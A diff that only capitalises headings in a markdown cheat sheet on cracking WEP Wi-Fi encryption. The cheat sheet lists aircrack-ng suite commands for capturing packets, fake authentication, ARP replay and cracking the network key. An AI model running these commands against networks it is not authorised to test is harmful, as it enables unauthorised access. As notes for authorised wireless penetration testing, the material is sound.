@@ -1,4 +1,4 @@
-### no replay-defense -  crypto is weak - can be cracked fast when at least 20 K packets captured
+### No replay-defense -  crypto is weak - can be cracked fast when at least 20 K packets captured
 ```
 airmon-ng check
 airmon-ng check kill
@@ -11,12 +11,12 @@ airodump-ng <interface> --bssid <bssid> --channel <channel> --write <file>
 aireplay-ng -1 0 -a <bssid> <interface>
 ```
 
-### replay arp packages to speed up traffic
+### Replay arp packages to speed up traffic
 ```
 aireplay-ng <interface> --arpreplay -b <bssid>
 ```
 
-### crack password
+### Crack password
 ```
 aircrack-ng <file>.cap
 ```
